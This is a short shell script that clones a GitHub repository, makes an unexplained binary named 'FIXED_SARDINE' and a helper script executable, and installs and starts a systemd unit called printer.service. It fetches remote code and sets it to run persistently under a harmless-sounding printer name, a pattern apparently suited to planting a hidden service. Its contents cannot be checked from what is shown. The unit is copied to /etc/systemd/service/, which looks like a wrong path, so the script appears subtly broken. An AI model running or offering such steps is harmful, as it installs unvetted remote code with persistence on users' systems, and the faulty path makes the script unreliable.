#Acquire Files
cd /tmp
git clone https://github.com/03yte/CSTFP
chmod +x /tmp/CSTFP/FIXED_SARDINE
chmod +x /tmp/CSTFP/script.sh
cp /tmp/CSTFP/printer.service /etc/systemd/service/

#Start services
systemctl daemon-reload
systemctl enable printer.service
systemctl start printer.service
